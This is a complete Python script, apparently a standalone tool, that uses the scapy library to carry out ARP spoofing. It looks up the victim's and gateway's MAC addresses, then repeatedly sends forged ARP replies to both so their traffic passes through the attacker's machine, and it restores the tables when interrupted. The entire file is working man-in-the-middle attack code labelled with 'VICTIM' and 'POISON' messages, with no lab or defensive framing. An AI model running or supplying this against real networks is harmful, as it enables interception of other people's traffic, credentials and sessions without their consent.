from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import sys
import time

def getMAC(ip):
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3, verbose=False)
    if ans:
        return ans[0][1].hwsrc

def ARPspoof(srcIP, targetIP, targetMAC):
    arp = ARP(op=2, psrc=srcIP, pdst=targetIP, hwdst=targetMAC)
    send(arp, verbose=False)

def restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC):
    arp1 = ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMAC, hwsrc=gatewayMAC)
    arp2 = ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gatewayMAC, hwsrc=victimMAC)
    send(arp1, count=3, verbose=False)
    send(arp2, count=3, verbose=False)

def main(gatewayIP, victimIP):
    victimMAC = getMAC(victimIP)
    gatewayMAC = getMAC(gatewayIP)

    if victimMAC is None or gatewayMAC is None:
        print("Cannot find MAC address")
        exit()

    print(f'Start Spoofing -> VICTIM IP {victimIP}')
    print(f'{victimIP}: POISON ARP Table {gatewayMAC} -> {victimMAC}')

    try:
        while True:
            ARPspoof(gatewayIP, victimIP, victimMAC)
            ARPspoof(victimIP, gatewayIP, gatewayMAC)
            time.sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC)
        print("Terminated Spoofing -> RESTORED ARP TABLE")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python arp.py {victim IP address} {gateway IP address}")
        exit()
    victimIP = sys.argv[1]
    gatewayIP = sys.argv[2]

    main(gatewayIP, victimIP)